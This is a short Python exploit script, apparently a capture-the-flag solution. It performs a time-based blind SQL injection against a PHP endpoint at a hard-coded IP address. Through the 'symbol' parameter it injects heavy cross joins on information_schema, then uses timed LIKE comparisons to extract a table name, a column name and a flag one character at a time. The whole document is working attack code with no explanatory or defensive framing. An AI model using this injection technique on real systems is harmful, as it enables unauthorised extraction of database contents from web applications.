import requests
import string
import time

str_list = string.printable.replace('%','').replace('_','')

def execute(s, url, data, Time):
	result = data
	p = 1
	while p == 1:
		start = result
		for s in str_list:
			start_time = time.time()
			requests.get(url.format((result + s + '%').encode().hex()))
			if (time.time() - start_time) > Time:
				result += s
				break
		if start == result:
			p = 0
	return result

if __name__ == '__main__':
	print("[*] Start an exploit")
	print(f"[*] The table name is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on m.table_name like 0x{}', 'fl', 1.4)}")
	print(f"[*] The column name is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns as f on f.column_name like 0x{}', 'fl', 0.1)}")
	print(f"[*] The flag is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns cross join flag as c on c.flag like 0x{}', 'fl', 1.4)}")
	print("[*] Congratulations for to leak a flag XD")
